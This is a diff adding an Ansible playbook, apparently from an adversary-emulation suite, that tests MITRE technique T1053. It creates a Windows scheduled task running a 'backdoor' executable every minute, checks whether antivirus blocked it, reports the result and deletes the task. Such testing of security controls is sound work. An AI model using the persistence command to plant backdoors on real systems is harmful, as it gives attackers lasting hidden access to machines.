@@ -1,0 +1,36 @@
+# attack_technique: T1053
+- name: T1053 - Scheduled Task
+  hosts: windows
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+        - name: create a new schedule task which will run evry minute
+          tags: always
+          win_command: |
+            schtasks /create /sc minute /mo 1 /tn "{{ backdoor_svc_name }}" /tr {{ backdoor_exe }}
+          
+        - name: sleep for 10 seconds and continue with play to check if AV removed or Not
+          tags: always
+          wait_for: timeout=10
+          delegate_to: localhost
+          
+        - name: Check task created
+          tags: always
+          win_command: |
+            schtasks /query /tn "{{ backdoor_svc_name }}"
+          register: T1053
+          
+        - name: check if playbook was blocked
+          tags: always
+          debug: msg="Playbook Completed#T1053#blocked#win#"
+          when: "'ERROR' in T1053.stdout"       
+        - name: check if playbook was successfull
+          tags: always
+          debug: msg="Playbook Completed#T1053#passed#win#"
+          when: "'ERROR' not in T1053.stdout"
+          
+        - name: cleanup schedule task      
+          tags: always
+          win_command: |
+            schtasks /delete /tn "{{ backdoor_svc_name }}" /f
+          when: "'ERROR' not in T1053.stdout"
